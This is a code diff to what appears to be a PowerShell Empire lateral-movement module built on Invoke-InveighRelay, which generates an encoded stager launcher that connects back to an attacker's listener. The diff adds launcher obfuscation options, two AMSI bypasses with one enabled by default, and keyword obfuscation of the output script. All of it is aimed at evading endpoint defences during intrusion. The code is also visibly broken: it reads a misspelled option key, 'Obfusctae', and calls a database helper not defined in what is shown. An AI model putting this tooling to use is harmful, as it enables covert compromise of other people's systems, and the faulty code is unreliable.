@@ -2,6 +2,7 @@ from __future__ import print_function
 from builtins import str
 from builtins import object
 from lib.common import helpers
+import threading
 
 
 class Module(object):
@@ -56,6 +57,26 @@ class Module(object):
                 'Description': 'Listener to use.',
                 'Required': False,
                 'Value': ''
+            },
+            'Obfuscate': {
+                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'ObfuscateCommand': {
+                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required': False,
+                'Value': r'Token\All\1'
+            },
+            'AMSIBypass': {
+                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'True'
+            },
+            'AMSIBypass2': {
+                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
             },
             'UserAgent': {
                 'Description': 'User-agent string to use for the staging request (default, none, or other).',
@@ -143,7 +164,10 @@ class Module(object):
         # save off a copy of the mainMenu object to access external functionality
         #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
-        
+
+        # used to protect self.http and self.mainMenu.conn during threaded listener access
+        self.lock = threading.Lock()
+
         for param in params:
             # parameter format is [Name, Value]
             option, value = param
@@ -151,13 +175,25 @@ class Module(object):
                 self.options[option]['Value'] = value
     
     def generate(self, obfuscate=False, obfuscationCommand=""):
-        
+
+        # Set booleans to false by default
+        Obfuscate = False
+        AMSIBypass = False
+        AMSIBypass2 = False
+
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy_']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
         command = self.options['Command']['Value']
-        
+        if (self.options['Obfusctae']['Value']).lower() == 'true':
+            Obfuscate =True
+        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
+        if (self.options['AMSIBypass']['Value']).lower() == 'true':
+            AMSIBypass = True
+        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
+            AMSIBypass2 = True
+
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-InveighRelay.ps1"
         if obfuscate:
@@ -184,8 +220,13 @@ class Module(object):
                 
                 # generate the PowerShell one-liner with all of the proper options set
                 command = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True,
-                                                                  userAgent=userAgent, proxy=proxy,
-                                                                  proxyCreds=proxyCreds)
+                                                                  obfuscate=Obfuscate, obfuscationCommand=ObfuscateCommand, userAgent=userAgent, proxy=proxy,
+                                                                  proxyCreds=proxyCreds, AMSIBypass=AMSIBypass, AMSIBypass2=AMSIBypass2)
+                # check if launcher errored out. If so return nothing
+                if command == "":
+                    print(helpers.color("[!] Error in launcher generation."))
+                    return ""
+
         # set defaults for Empire
         scriptEnd = "\n" + 'Invoke-InveighRelay -Tool "2" -Command \\"%s\\"' % (command)
         
@@ -205,4 +246,11 @@ class Module(object):
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd,
                                           obfuscationCommand=obfuscationCommand)
         script += scriptEnd
+
+        # Get the random function name generated at install and patch the stager with the proper function name
+        conn = self.get_db_connection()
+        self.lock.acquire()
+        script = helpers.keyword_obfuscation(script, conn)
+        self.lock.release()
+
         return script
